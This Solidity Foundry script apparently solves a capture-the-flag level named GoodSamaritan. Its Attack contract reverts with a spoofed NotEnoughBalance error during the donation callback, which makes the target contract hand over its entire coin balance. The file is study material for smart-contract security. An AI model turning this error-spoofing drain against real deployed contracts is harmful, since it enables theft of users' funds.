// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GoodSamaritan, Coin, Wallet} from "../src/27_GoodSamaritan.sol";
import {Script, console} from "forge-std/Script.sol";

contract GoodSamaritanSolve is Script {
    GoodSamaritan good = GoodSamaritan(0x2fBC5031EA61b6BBce0964ddCE51319596D46552);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Wallet wallet = good.wallet();
        Coin coin = good.coin();
        console.log("GoodSamaritan Address#", address(good));
        console.log("Balance of Wallet#", coin.balances(address(wallet)));
        console.log("Wallet Owner#", wallet.owner());
        new Attack().pwn();
        console.log("Balance of Wallet#", coin.balances(address(wallet)));
        vm.stopBroadcast();
    }
}

contract Attack {
    error NotEnoughBalance();

    GoodSamaritan good = GoodSamaritan(0x2fBC5031EA61b6BBce0964ddCE51319596D46552);

    function pwn() external {
        good.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
